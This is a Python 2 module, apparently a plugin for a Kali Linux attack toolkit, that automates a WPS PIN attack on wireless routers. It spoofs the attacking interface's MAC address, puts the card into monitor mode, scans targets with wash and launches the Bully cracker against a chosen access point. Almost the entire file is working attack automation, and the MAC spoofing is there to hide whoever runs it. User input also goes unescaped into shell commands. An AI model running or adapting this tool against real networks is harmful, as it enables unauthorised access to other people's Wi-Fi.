#!/usr/bin/env python
from __future__ import print_function
import subprocess, sys, time, thread, re, os

''' 
This section of the program uses the kali tool 'Bully'. Bully is a tool to
crack wireless router passwords through a WPS attack. Please refer to the Bully manual
for more info on the Bully tool.

If there are any questions please email me at joejoejoey13@gmail.com. 
'''

short_name = 'Bully'
disp_name = 'Conduct WPS crack'
otype = 'Routine'
need = ['Which interface would you like to use: ', 'How would you like to mask the MAC \n 1.) Set a random vendor MAC same kind \n 2.) Set a random vendor MAC of any kind \n'
        ' 3.) Set fully random MAC \n 4.) Enter MAC manually: \n 5.) Keep MAC the same \n', 'Which AP would you like to go after: ', 'What channel is the AP on: ', 'Would you like to save your output (y/n): ']
answers = []

# Main definition
def run():
    global answers; answers = []
    wait_timer('Gathering interface info...')
# This section saves the output of ifconfig
    if_check = subprocess.check_output('sudo ifconfig -s', shell=True)
# This section clears any network device that might already be in monitor mode    
    numbers = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
    for x in numbers:
        if 'mon'+x in if_check: subprocess.call('sudo airmon-ng stop mon%s' % x, shell=True)
        if 'wlan'+x in if_check: subprocess.call('sudo macchanger -p wlan%s' % x, shell=True)
# This section saves the output of ifconfig
    if_check = subprocess.check_output('sudo ifconfig -s', shell=True)
    subprocess.call('clear', shell=True) 
    raw_input("Please disconnect from any network you might be connected to... \nPress enter to continue")
    subprocess.call('clear', shell=True)
# This section prompts the user for the MAC settings and settings for the 'Bully' command
    i = 0
    while i < len(need):
        if i == 0: print(if_check)
# This section will output the wash command, which will scan for wireless routers in the area and their WPS lock status        
        if i == 2: thread.start_new_thread( wash_thread, ("Wash thread", ) )
        ans = raw_input(need[i])

        if validate(ans, i, if_check):
            i += 1
# This section starts a thread that runs the bully command
    thread.start_new_thread( bully_thread, ("Bully thread", ) )
    time.sleep(1)
    raw_input("Press enter to return to the main menu...")
    return

# This definition validates user's input
def validate(ans, i, device_check):
    global answers
    if i == 0:
        eth = ['eth' + ifnum.__str__() for ifnum in range(0, 9)]; wlan = ['wlan' + ifnum.__str__() for ifnum in range(0, 9)]
        if ans in device_check and (ans in eth or ans in wlan): 
            answers.append(ans)
            subprocess.call('sudo macchanger %s -s' % answers[0], shell=True)
            return True
    if i == 1:
        if 0 < int(ans) < 6:
            manual_mac = False
            if int(ans) == 1: MAC_changer("-a", "", manual_mac)
            if int(ans) == 2: MAC_changer("-A", "", manual_mac)
            if int(ans) == 3: MAC_changer("-r", "", manual_mac)
            if int(ans) == 4:
                while True:
                    manual_mac = True
                    custom_mac = raw_input("What would you like your mac to be?\n")
                    if re.match("([a-fA-F0-9]{2}[:|\-]?){6}", custom_mac): break
                    else: print('Not a valid mac')
                MAC_changer("-m", custom_mac, manual_mac)
            return True
    if i == 2:
        if re.match("([a-fA-F0-9]{2}[:|\-]?){6}", ans): answers.append(ans); return True
    if i == 3:
        if 0 < int(ans) < 13: answers.append(ans); return True
    if i == 4:
        if re.match("y", ans):
            while True:
                save_loc = raw_input("Where would you like to save the output?\n")
                if not save_loc.endswith("\/"):
                    save_loc = save_loc+"/"
                if os.path.isdir(save_loc):
                    write_name = raw_input("What would you like to call your output file?\n")
                    answers.append(save_loc+write_name); return True
                print("Not a valid location.\n")
	if re.match("n", ans): return True
    return False

# This definition prints a wait timer
def wait_timer(on_what):
    sys.stdout.write(on_what)
    timer = 4
    while timer > 0:
        sys.stdout.write('.')
        sys.stdout.flush()
        time.sleep(0.25)
        timer = timer - 1

# This definition starts the thread that runs the 'wash' command in a new window. 
def wash_thread(thread_name):
    subprocess.call("xterm -e sudo wash -i mon0 -C", shell=True)

# This definition starts the 'Bully' command in a new window
def bully_thread(thread_name):
    global answers
    print(thread_name+" is running...\n")
# If save location is appended to answers, length of answers will be 4, so the below 'else' will be executed    
    if len(answers) == 3: subprocess.call("xterm -e sudo bully -b %s -c %s mon0" % (answers[1], answers[2]), shell=True)
    else: subprocess.call("xterm -e sudo bully -b %s -c %s -o %s mon0" % (answers[1], answers[2], answers[3]), shell=True)

# This definition changes the network adaptors MAC address
def MAC_changer(option, custom_mac, manual_mac):
    os.system("sudo ifconfig %s down" % answers[0])
    if manual_mac == False: subprocess.call("sudo macchanger "+option+" "+answers[0], shell=True)
    else: os.system("sudo macchanger %s %s %s" % (option, custom_mac, answers[0]))
    os.system("sudo ifconfig %s up" % answers[0])
    subprocess.call('sudo airmon-ng start %s' % answers[0], shell=True)


